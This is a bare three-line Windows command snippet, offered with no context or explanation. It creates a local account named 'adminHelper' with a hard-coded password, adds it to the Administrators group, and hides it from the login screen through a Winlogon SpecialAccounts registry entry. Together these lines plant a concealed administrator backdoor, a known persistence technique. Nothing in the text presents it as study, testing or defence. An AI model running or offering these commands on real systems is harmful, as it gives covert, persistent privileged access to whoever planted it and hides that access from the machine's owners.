cmd /c "net user adminHelper P@ssw0rd123! /add"
cmd /c "net localgroup Administrators adminHelper /add"
cmd /c "reg add \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /v adminHelper /t REG_DWORD /d 0 /f"